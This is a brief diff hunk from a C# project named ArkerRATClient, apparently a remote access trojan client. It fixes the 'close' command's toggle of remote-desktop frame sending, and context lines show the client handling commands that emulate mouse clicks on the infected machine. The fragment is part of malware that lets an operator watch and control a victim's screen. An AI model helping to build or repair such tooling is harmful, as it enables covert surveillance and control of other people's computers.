@@ -242,7 +242,7 @@ namespace ArkerRATClient
                             }
                             else if (subString.Contains("close"))
                             {
-                                RemoteDesktop.sendingFrames = RemoteDesktop.sendingFrames;
+                                RemoteDesktop.sendingFrames = !RemoteDesktop.sendingFrames;
                             }
                             else if (subString.Contains("§ClickPositionStart§"))
                                 RemoteDesktop.EmulateClick(subString);
